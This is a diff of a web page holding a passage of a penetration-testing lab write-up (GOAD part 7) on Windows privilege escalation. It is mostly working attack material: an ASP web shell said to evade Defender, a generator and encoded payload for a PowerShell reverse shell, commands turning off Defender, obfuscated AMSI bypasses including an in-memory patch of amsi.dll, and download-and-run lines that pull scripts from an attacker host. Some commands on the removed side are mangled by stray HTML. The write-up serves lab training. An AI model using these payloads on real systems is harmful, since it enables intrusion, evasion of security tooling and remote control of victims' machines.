@@ -9,47 +9,6 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
-  <style>
-    /* GOAD Content Styles */
-    .article-content { line-height: 1.8; }
-    .article-content h1 { font-size: 2rem; margin: 30px 0 20px; color: var(--white-2); border-bottom: 2px solid #ffdb70; padding-bottom: 10px; }
-    .article-content h2 { font-size: 1.5rem; margin: 25px 0 15px; color: var(--white-2); }
-    .article-content h3 { font-size: 1.25rem; margin: 20px 0 10px; color: var(--white-2); }
-    .article-content h4 { font-size: 1.1rem; margin: 15px 0 10px; color: var(--white-2); }
-    .article-content p { margin: 15px 0; color: var(--light-gray); }
-    .article-content strong { color: var(--white-2); font-weight: 600; }
-    .article-content ul { margin: 15px 0 15px 30px; }
-    .article-content li { margin: 5px 0; color: var(--light-gray); }
-    .article-image { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.3); }
-    
-    /* Code blocks with yellow border */
-    .article-content pre { 
-      background: #1e1e1e; 
-      border-left: 4px solid #ffdb70;
-      padding: 15px; 
-      margin: 20px 0;
-      border-radius: 0 8px 8px 0; 
-      overflow-x: auto;
-      font-family: 'Courier New', monospace;
-      font-size: 0.9rem;
-    }
-    .article-content code { 
-      font-family: 'Courier New', monospace; 
-      background: #2d2d2d; 
-      padding: 2px 6px; 
-      border-radius: 4px;
-      color: #ffdb70;
-      font-size: 0.9em;
-    }
-    .article-content pre code { 
-      background: none; 
-      padding: 0;
-      color: #f8f8f2;
-    }
-    
-    .article-content a { color: #ffdb70; text-decoration: none; }
-    .article-content a:hover { text-decoration: underline; }
-  </style>
 </head>
 <body>
   <main>
@@ -67,7 +26,6 @@
           <ion-icon name="chevron-down"></ion-icon>
         </button>
       </div>
-      
       <div class="sidebar-info_more">
         <div class="separator"></div>
         <ul class="contacts-list">
@@ -113,362 +71,277 @@
 
       <article class="about active" data-page="about">
         <header class="h2 article-title">Part 7</header>
-        <section class="about-text article-content">
-          <h2>GOAD - part 7 - Privilege escalation - RBCD exploitation not working (KCD) Constrained - to be finished</h2>
-    
-    In this part section we will focus a little bit on privilege escalation.
-    
-    Let’s assume that we do have a webpage exposed somewhere that allows us to upload files, at some point we were able to straightforward upload the file we want to with no filter at all or we were even able to bypass any filter mechanism or WAF.
-    
-    <img src="images/image-194.png" alt="Untitled" class="article-image" loading="lazy">
-    
-    Let’s create a basic <code>.asp</code> payload for command execution and upload it.
-    
-    > <em>At the time of writing, this avoid defender signature</em>
-    > 
-    
-    <pre><code class="language-python">    &lt;%
-    Function getResult(theParam)
-        Dim objSh, objResult
-        Set objSh = CreateObject("WScript.Shell")
-        Set objResult = objSh.exec(theParam)
-        getResult = objResult.StdOut.ReadAll
-    end Function
-    %&gt;
-    &lt;HTML&gt;
-        &lt;BODY&gt;
-            Enter command:
-                &lt;FORM action="" method="POST"&gt;
-                    &lt;input type="text" name="param" size=45 value="&lt;%= myValue %&gt;"&gt;
-                    &lt;input type="submit" value="Run"&gt;
-                &lt;/FORM&gt;
-                &lt;p&gt;
-            Result :
-            &lt;% 
-            myValue = request("param")
-            thisDir = getResult("cmd /c" &amp; myValue)
-            Response.Write(thisDir)
-            %&gt;
-            &lt;/p&gt;
-            &lt;br&gt;
-        &lt;/BODY&gt;
-    &lt;/HTML&gt;
-    </code></pre>
-    
-    After uploading it we can simply call it from the upload directory and we are able now to execute OS commands in the machine.
-    
-    <img src="images/image-195.png" alt="Untitled" class="article-image" loading="lazy">
-    
-    We can continue from here using the webpage interface or we can get a reverse shell which is better.
-    
-    Let’s use the following payload to generate a reverse shell and encode it to base64 so we can also bypass Windows Defender detection  as well.
-    
-    <pre><code class="language-python">    #!/usr/bin/env python
-    import base64
-    import sys
-    
-    if len(sys.argv) &lt; 3:
-      print('usage : %s ip port' % sys.argv[0])
-      sys.exit(0)
-    
-    payload="""
-    $c = New-Object System.Net.Sockets.TCPClient('%s',%s);
-    $s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
-    while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
-        $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
-        $sb = (iex $d 2&gt;&amp;1 | Out-String );
-        $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps&gt; ');
-        $s.Write($sb,0,$sb.Length);
-        $s.Flush()
-    };
-    $c.Close()
-    """ % (sys.argv[1], sys.argv[2])
-    
-    byte = payload.encode('utf-16-le')
-    b64 = base64.b64encode(byte)
-    print("powershell -exec bypass -enc %s" % b64.decode())
-    </code></pre>
-    
-    Creating the reverse shell and encoding it to base64.
-    
-    <code>./Shell_ConvB64.py 10.4.10.1 53</code>
-    
-    <pre><code class="language-python">    powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAOQAyAC4AMQA2ADgALgA1ADYALgAxACcALAA1ADMAKQA7AAoAJABzACAAPQAgACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACAAIAAgACAAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiACAAKwAgACcAcABzAD4AIAAnACkAOwAKACAAIAAgACAAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsACgAgACAAIAAgACQAcwAuAEYAbAB1AHMAaAAoACkACgB9ADsACgAkAGMALgBDAGwAbwBzAGUAKAApAAoA
-    </code></pre>
-    
-    Now we can use this payload in base64 and execute it on our webpage.
-    
-    <code>rlwrap nc -lnvp 53</code>
-    
-    <img src="images/image-196.png" alt="Untitled" class="article-image" loading="lazy">
-    
-    As we can see above, I used <code>rlwrap</code> with <code>NetCat</code>.
-    
-    Once we are inside the target machine, we can start with a basic user enumeration command:
-    <code>whoami /all</code>
-    
-    <img src="images/image-197.png" alt="Untitled" class="article-image" loading="lazy">
-    
-    The command output shows us several valid info, User info, Group info and Privileges Info for this user.
-    
-    As an IIS service user we got <code>SeImpersonatePrivilege</code> privilege, this privilege is enabled by default for this service account.
-    
-    # <strong>Privesc</strong>
-    
-    for this privesc we will focus on 2 types of privescs that got a “NOT FIX” by Microsoft which are PrintSpoofer and KrbRelay.
-    
-    > <em>To do all following tests Windows Defender must enabled on all system. Castelblack got defender disabled by default, you should enable it before testing the privesc technics described here</em>
-    > 
-    
-    ### Disable RealTime Defender using an Admin Account
-    
-    <code>Set-MpPreference -DisableRealtimeMonitoring $true
-    Set-MpPreference -DisableIOAVProtection $true
-    set-MpPreference -DisableAutoExclusions $true</code>
-    
-    ### Enable RealTime Defender using an Admin Account
-    
-    <code>Set-MpPreference -DisableRealtimeMonitoring $false
-    Set-MpPreference -DisableIOAVProtection $false
-    set-MpPreference -DisableAutoExclusions $false</code>
-    
-    ## <strong>AMSI - Anti-Malware Scan Interface bypass</strong>
-    
-    At a high level, think of AMSI like a bridge which connects powershell to the antivirus software, every command or script we run inside powershell is fetched by AMSI and sent to installed antivirus software for inspection.
-    AMSI works on signature-based detection. This means that for every particular malicious keyword, URL, function or procedure, AMSI has a related signature in its database. So, if an attacker uses that same keyword in his code again, AMSI blocks the execution then and there.
-    
-    There are several ways to bypass this protection and this is what we will be focused in this session.
-    
-    You can check several AMSI bypass in this <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" target="_blank">Repo</a> by S3cur3Th1sSh1t.
-    
-    There is also the website <a href="http://amsi.fail" target="_blank">amsi.fail</a> that generates obfuscated PowerShell snippets that break or disable AMSI for the current process.
-    
-    This PDF is a nice resource to have a look on:
-    
-    <a href="https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf" target="_blank">https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf</a>
-    
-    AMSI Bypass windows 11https://github.com/senzee1984/Amsi_Bypass_In_2023
-    
-    If CMD non Admin right:
-    
-    <strong>RunWithRegistryNonAdmin.bat</strong>
-    
-    <pre><code class="language-bash">    set COR_ENABLE_PROFILING=1
-    set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
-    
-    REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
-    REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
-    REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "%~dp0InvisiShellProfiler.dll" /f
-    
-    powershell
-    
-    set COR_ENABLE_PROFILING=
-    set COR_PROFILER=
-    REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
-    </code></pre>
-    
-    If CMD Admin right
-    <strong>RunWithPathAsAdmin.bat</strong>
-    
-    <pre><code class="language-bash">    set COR_ENABLE_PROFILING=1
-    set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
-    set COR_PROFILER_PATH=%~dp0InvisiShellProfiler.dll
-    
-    powershell
-    
-    set COR_ENABLE_PROFILING=
-    set COR_PROFILER=
-    set COR_PROFILER_PATH=
-    </code></pre>
-    
-    Then in PowerShell
-    
-    <pre><code class="language-bash">    S<code>eT-It</code>em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) (&lt;a href=" "{1}{0}"-F'F','rE' " target="_blank"&gt;TYpE&lt;/a&gt; ) ; ( Get-varI<code>A</code>BLE (('1Q'+'2U') +'zX' ) -VaL )."A<code>ss</code>Embly"."GET<code>TY</code>Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g<code>etf</code>iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE<code>T</code>VaLUE"(${n<code>ULl},${t</code>RuE} )
-    </code></pre>
-    
-    <code>(New-Object Net.WebClient).DownloadFile('&lt;a href="http://192.168.56.1:8080/PowerView.ps1','C:%5C%5Ctmp%5C%5CPowerView.ps1" target="_blank"&gt;http://10.4.10.1:8080/PowerView.ps1','C:\\tmp\\PowerView.ps1&lt;/a&gt;')</code>
-    
-    Invisi-Shell https://github.com/OmerYa/Invisi-Shell
-    
-    AMSI Bypass (if you are in Powershell revershe shell using Evil-WinRM remote access to the target)
-    
-    <pre><code class="language-bash">    $x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
-    </code></pre>
-    
-    Once we have done that we can use the rasta mouse AMSI bypass to disable AMSI at the .net level. If you want to know why you have to do that, you should read this blog 
-    post from @ShitSecure explaining the difference between powershell and .net AMSI level : <a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/" target="_blank">https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/</a>
-    
-    Now lets use Rasta-Mouse  AMSI-Bypass, add it to a .txt file and upload it to the target and execute it.
-    
-    <pre><code class="language-bash">    # Patching amsi.dll AmsiScanBuffer by rasta-mouse
-    $Win32 = @"
-    
-    using System;
-    using System.Runtime.InteropServices;
-    
-    public class Win32 {
-    
-        [DllImport("kernel32")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    
-        [DllImport("kernel32")]
-        public static extern IntPtr LoadLibrary(string name);
-    
-        [DllImport("kernel32")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-    
-    }
-    "@
-    
-    Add-Type $Win32
-    
-    $LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
-    $Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
-    $p = 0
-    [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
-    $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-    [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
-    </code></pre>
-    
-    EXECUTION:
-    
-    AMSI Bypass
-    
-    <code>$x=[Ref].Assembly.GetType('&lt;a href="http://system.management.automation.am/" target="_blank"&gt;System.Management.Automation.Am&lt;/a&gt;'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text'[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)</code>
-    Disable AMSI at the .net level
-    <code>(new-object system.net.webclient).downloadstring('http://10.4.10.1:8080/amsi.txt')|IEX</code>
-    
-    <img src="images/image-198.png" alt="Untitled" class="article-image" loading="lazy">
-    
+        <section class="about-text">
+          <ul>
+<li><p><strong>GOAD - part 7 - Privilege escalation - RBCD exploitation not working (KCD) Constrained - to be finished</strong></p>
+<p>In this part section we will focus a little bit on privilege escalation.</p>
+<p>Let’s assume that we do have a webpage exposed somewhere that allows us to upload files, at some point we were able to straightforward upload the file we want to with no filter at all or we were even able to bypass any filter mechanism or WAF.</p>
+<figure>
+<img src="images/image-194.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
+<p>Let’s create a basic <code>.asp</code> payload for command execution and upload it.</p>
+<blockquote>
+<p><em>At the time of writing, this avoid defender signature</em></p>
+</blockquote>
+<pre class="python"><code>&lt;%
+Function getResult(theParam)
+    Dim objSh, objResult
+    Set objSh = CreateObject(&quot;WScript.Shell&quot;)
+    Set objResult = objSh.exec(theParam)
+    getResult = objResult.StdOut.ReadAll
+end Function
+%&gt;
+&lt;HTML&gt;
+    &lt;BODY&gt;
+        Enter command:
+            &lt;FORM action=&quot;&quot; method=&quot;POST&quot;&gt;
+                &lt;input type=&quot;text&quot; name=&quot;param&quot; size=45 value=&quot;&lt;%= myValue %&gt;&quot;&gt;
+                &lt;input type=&quot;submit&quot; value=&quot;Run&quot;&gt;
+            &lt;/FORM&gt;
+            &lt;p&gt;
+        Result :
+        &lt;% 
+        myValue = request(&quot;param&quot;)
+        thisDir = getResult(&quot;cmd /c&quot; &amp; myValue)
+        Response.Write(thisDir)
+        %&gt;
+        &lt;/p&gt;
+        &lt;br&gt;
+    &lt;/BODY&gt;
+&lt;/HTML&gt;</code></pre>
+<p>After uploading it we can simply call it from the upload directory and we are able now to execute OS commands in the machine.</p>
+<figure>
+<img src="images/image-195.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
+<p>We can continue from here using the webpage interface or we can get a reverse shell which is better.</p>
+<p>Let’s use the following payload to generate a reverse shell and encode it to base64 so we can also bypass Windows Defender detection as well.</p>
+<pre class="python"><code>#!/usr/bin/env python
+import base64
+import sys
+
+if len(sys.argv) &lt; 3:
+  print(&#39;usage : %s ip port&#39; % sys.argv[0])
+  sys.exit(0)
+
+payload=&quot;&quot;&quot;
+$c = New-Object System.Net.Sockets.TCPClient(&#39;%s&#39;,%s);
+$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
+while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
+    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
+    $sb = (iex $d 2&gt;&amp;1 | Out-String );
+    $sb = ([text.encoding]::ASCII).GetBytes($sb + &#39;ps&gt; &#39;);
+    $s.Write($sb,0,$sb.Length);
+    $s.Flush()
+};
+$c.Close()
+&quot;&quot;&quot; % (sys.argv[1], sys.argv[2])
+
+byte = payload.encode(&#39;utf-16-le&#39;)
+b64 = base64.b64encode(byte)
+print(&quot;powershell -exec bypass -enc %s&quot; % b64.decode())</code></pre>
+<p>Creating the reverse shell and encoding it to base64.</p>
+<p><code>./Shell_ConvB64.py 10.4.10.1 53</code></p>
+<pre class="python"><code>powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAOQAyAC4AMQA2ADgALgA1ADYALgAxACcALAA1ADMAKQA7AAoAJABzACAAPQAgACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACAAIAAgACAAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiACAAKwAgACcAcABzAD4AIAAnACkAOwAKACAAIAAgACAAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsACgAgACAAIAAgACQAcwAuAEYAbAB1AHMAaAAoACkACgB9ADsACgAkAGMALgBDAGwAbwBzAGUAKAApAAoA</code></pre>
+<p>Now we can use this payload in base64 and execute it on our webpage.</p>
+<p><code>rlwrap nc -lnvp 53</code></p>
+<figure>
+<img src="images/image-196.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
+<p>As we can see above, I used <code>rlwrap</code> with <code>NetCat</code>.</p>
+<p>Once we are inside the target machine, we can start with a basic user enumeration command: <code>whoami /all</code></p>
+<figure>
+<img src="images/image-197.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
+<p>The command output shows us several valid info, User info, Group info and Privileges Info for this user.</p>
+<p>As an IIS service user we got <code>SeImpersonatePrivilege</code> privilege, this privilege is enabled by default for this service account.</p>
+<p># <strong>Privesc</strong></p>
+<p>for this privesc we will focus on 2 types of privescs that got a “NOT FIX” by Microsoft which are PrintSpoofer and KrbRelay.</p>
+<blockquote>
+<p><em>To do all following tests Windows Defender must enabled on all system. Castelblack got defender disabled by default, you should enable it before testing the privesc technics described here</em></p>
+</blockquote>
+<p>### Disable RealTime Defender using an Admin Account</p>
+<p><code>Set-MpPreference -DisableRealtimeMonitoring $true   Set-MpPreference -DisableIOAVProtection $true   set-MpPreference -DisableAutoExclusions $true</code></p>
+<p>### Enable RealTime Defender using an Admin Account</p>
+<p><code>Set-MpPreference -DisableRealtimeMonitoring $false   Set-MpPreference -DisableIOAVProtection $false   set-MpPreference -DisableAutoExclusions $false</code></p>
+<p>## <strong>AMSI - Anti-Malware Scan Interface bypass</strong></p>
+<p>At a high level, think of AMSI like a bridge which connects powershell to the antivirus software, every command or script we run inside powershell is fetched by AMSI and sent to installed antivirus software for inspection. AMSI works on signature-based detection. This means that for every particular malicious keyword, URL, function or procedure, AMSI has a related signature in its database. So, if an attacker uses that same keyword in his code again, AMSI blocks the execution then and there.</p>
+<p>There are several ways to bypass this protection and this is what we will be focused in this session.</p>
+<p>You can check several AMSI bypass in this <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">Repo</a> by S3cur3Th1sSh1t.</p>
+<p>There is also the website <a href="http://amsi.fail">amsi.fail</a> that generates obfuscated PowerShell snippets that break or disable AMSI for the current process.</p>
+<p>This PDF is a nice resource to have a look on:</p>
+<p><a href="https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf">https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf</a></p>
+<p>AMSI Bypass windows 11https://github.com/senzee1984/Amsi_Bypass_In_2023</p>
+<p>If CMD non Admin right:</p>
+<p><strong>RunWithRegistryNonAdmin.bat</strong></p>
+<pre class="bash"><code>set COR_ENABLE_PROFILING=1
+set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+
+REG ADD &quot;HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}&quot; /f
+REG ADD &quot;HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32&quot; /f
+REG ADD &quot;HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32&quot; /ve /t REG_SZ /d &quot;%~dp0InvisiShellProfiler.dll&quot; /f
+
+powershell
+
+set COR_ENABLE_PROFILING=
+set COR_PROFILER=
+REG DELETE &quot;HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}&quot; /f</code></pre>
+<p>If CMD Admin right <strong>RunWithPathAsAdmin.bat</strong></p>
+<pre class="bash"><code>set COR_ENABLE_PROFILING=1
+set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+set COR_PROFILER_PATH=%~dp0InvisiShellProfiler.dll
+
+powershell
+
+set COR_ENABLE_PROFILING=
+set COR_PROFILER=
+set COR_PROFILER_PATH=</code></pre>
+<p>Then in PowerShell</p>
+<pre class="bash"><code>S`eT-It`em ( &#39;V&#39;+&#39;aR&#39; + &#39;IA&#39; + (&#39;blE:1&#39;+&#39;q2&#39;) + (&#39;uZ&#39;+&#39;x&#39;) ) ([TYpE]( &quot;{1}{0}&quot;-F&#39;F&#39;,&#39;rE&#39; ) ) ; ( Get-varI`A`BLE ((&#39;1Q&#39;+&#39;2U&#39;) +&#39;zX&#39; ) -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((&quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f(&#39;Uti&#39;+&#39;l&#39;),&#39;A&#39;,(&#39;Am&#39;+&#39;si&#39;),(&#39;.Man&#39;+&#39;age&#39;+&#39;men&#39;+&#39;t.&#39;),(&#39;u&#39;+&#39;to&#39;+&#39;mation.&#39;),&#39;s&#39;,(&#39;Syst&#39;+&#39;em&#39;) ) ).&quot;g`etf`iElD&quot;( ( &quot;{0}{2}{1}&quot; -f(&#39;a&#39;+&#39;msi&#39;),&#39;d&#39;,(&#39;I&#39;+&#39;nitF&#39;+&#39;aile&#39;) ),( &quot;{2}{4}{0}{1}{3}&quot; -f(&#39;S&#39;+&#39;tat&#39;),&#39;i&#39;,(&#39;Non&#39;+&#39;Publ&#39;+&#39;i&#39;),&#39;c&#39;,&#39;c,&#39; )).&quot;sE`T`VaLUE&quot;(${n`ULl},${t`RuE} )</code></pre>
+<p><code>(New-Object Net.WebClient).DownloadFile('[http://10.4.10.1:8080/PowerView.ps1','C:\\tmp\\PowerView.ps1](http://192.168.56.1:8080/PowerView.ps1','C:%5C%5Ctmp%5C%5CPowerView.ps1)')</code></p>
+<p>Invisi-Shell https://github.com/OmerYa/Invisi-Shell</p>
+<p>AMSI Bypass (if you are in Powershell revershe shell using Evil-WinRM remote access to the target)</p>
+<pre class="bash"><code>$x=[Ref].Assembly.GetType(&#39;System.Management.Automation.Am&#39;+&#39;siUt&#39;+&#39;ils&#39;);$y=$x.GetField(&#39;am&#39;+&#39;siCon&#39;+&#39;text&#39;,[Reflection.BindingFlags]&#39;NonPublic,Static&#39;);$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)</code></pre>
+<p>Once we have done that we can use the rasta mouse AMSI bypass to disable AMSI at the .net level. If you want to know why you have to do that, you should read this blog post from <span class="citation" data-cites="ShitSecure">@ShitSecure</span> explaining the difference between powershell and .net AMSI level : <a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/">https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/</a></p>
+<p>Now lets use Rasta-Mouse AMSI-Bypass, add it to a .txt file and upload it to the target and execute it.</p>
+<pre class="bash"><code># Patching amsi.dll AmsiScanBuffer by rasta-mouse
+$Win32 = @&quot;
+
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+
+    [DllImport(&quot;kernel32&quot;)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport(&quot;kernel32&quot;)]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport(&quot;kernel32&quot;)]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+}
+&quot;@
+
+Add-Type $Win32
+
+$LoadLibrary = [Win32]::LoadLibrary(&quot;amsi.dll&quot;)
+$Address = [Win32]::GetProcAddress($LoadLibrary, &quot;AmsiScanBuffer&quot;)
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)</code></pre>
+<p>EXECUTION:</p>
+<p>AMSI Bypass</p>
+<p><code>$x=[Ref].Assembly.GetType('[System.Management.Automation.Am](http://system.management.automation.am/)'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text'[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)</code> Disable AMSI at the .net level <code>(new-object system.net.webclient).downloadstring('http://10.4.10.1:8080/amsi.txt')|IEX</code></p>
+<figure>
+<img src="images/image-198.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
 <ul>
 <li>Once we have done that, we can play what we want with the condition to don’t touch the disk!</li>
 <li>We can now play all our .net application by running them directly with execute assembly.</li>
-    
 </ul>
-    ## <strong>WinPeas without touching disk</strong>
-    
-    Let’s use WinPEAS script to enumerate the machine and try to escalate our privilege. We can avoid AV detection now by hosting our LinPEAS on our attacking machine and load it in memory and play winPeas from memory with the following powershell commands (As winPeas is in .net we load the assembly and run it directly)
-    
-    If you don’t want to be bored to compile .net app or modify them with public class and method and no exit.environment you can also use <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack" target="_blank">PowerSharpPack</a> and get everything done for you (thanks again to @ShitSecure).
-    
-    <pre><code class="language-bash">    iex(new-object net.webclient).downloadstring('http://10.4.10.1:8080/PowerSharpPack.ps1')
-    PowerSharpPack -winPEAS
-    </code></pre>
-    
-    After executing it we just have to wait for it and see the magic happening.
-    
-    Analyzing winPEAS output, we can see that we do have some <code>SetImpersonatePrivilege</code> on the current user, so we can use it for privesc.
-    
-    <img src="images/image-199.png" alt="Untitled" class="article-image" loading="lazy">
-    
-    ## <strong>SeImpersonatePrivilege to Authority\system</strong>
-    
-    To escalate privileges from our low level user taking advantage of the <code>SetImpersonatePrivilege</code>, we can use one of the POTATOES techniques.
-    
-    You can learn more about <strong><em>Potatoes Windows Privilege Escalation</em></strong> here: <a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc" target="_blank">https://jlajara.gitlab.io/Potatoes_Windows_Privesc</a>
-    
-    For this one we will use <a href="https://github.com/CCob/SweetPotato" target="_blank">SweetPotato</a> which is a compilation of all potatoes.
-    
-    <pre><code class="language-bash">    echo "@echo off" &gt; runme.bat
-    echo "start /b $(python3 Shell_ConvB64.py 10.4.10.1 4445)" &gt;&gt; runme.bat
-    echo "exit /b" &gt;&gt; runme.bat
-    </code></pre>
-    
-    <img src="images/image-200.png" alt="Untitled" class="article-image" loading="lazy">
-    
+<p>## <strong>WinPeas without touching disk</strong></p>
